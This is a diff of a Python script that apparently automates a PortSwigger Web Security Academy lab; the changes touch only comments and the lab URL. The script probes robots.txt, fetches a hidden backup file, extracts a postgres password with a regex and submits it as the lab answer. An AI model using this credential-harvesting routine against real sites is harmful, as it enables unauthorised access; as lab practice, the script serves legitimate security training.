@@ -10,7 +10,7 @@
 #        2. List the hidden directory
 #        3. Fetch the hidden backup file
 #        4. Extract the key
-#        5. Submit the answer
+#        5. Submit solution
 #
 #################################################################
 
@@ -22,7 +22,7 @@ import re
 from colorama import Fore
 
 # change this url to your lab
-url = "https://0a0d004f03069dc08131cf9d0064000a.web-security-academy.net"
+url = "https://0adf007f03dd1eb884b46ae100220011.web-security-academy.net"
 
 try:
     robots = requests.get(
@@ -51,21 +51,21 @@ try:
                         r"\"postgres\",\s*\"postgres\",\s*\"(.*)\"", backup_file.text)[0]  # extract the key
                     print(Fore.WHITE + "6. Extracting key.. " +
                           Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + key)
-                try:  # try to submit the answer
+                try:  # try to submit solution
                     data = {
                         "answer": key
                     }
                     submit_answer = requests.post(
-                        f"{url}/submitsolution", data)  # submit the answer
+                        f"{url}/submitsolution", data)  # submit solution
                     if submit_answer.status_code == 200:
-                        print(Fore.WHITE + "7. Submitting the answer.. " +
+                        print(Fore.WHITE + "7. Submitting solution.. " +
                               Fore.GREEN + "OK")
                         print(
                             Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
 
                 except:
                     print(
-                        Fore.RED + "[!] Failed to submit the answer through exception")
+                        Fore.RED + "[!] Failed to submit solution through exception")
             except:
                 print(
                     Fore.RED + "[!] Failed to fetch the backup file through exception")
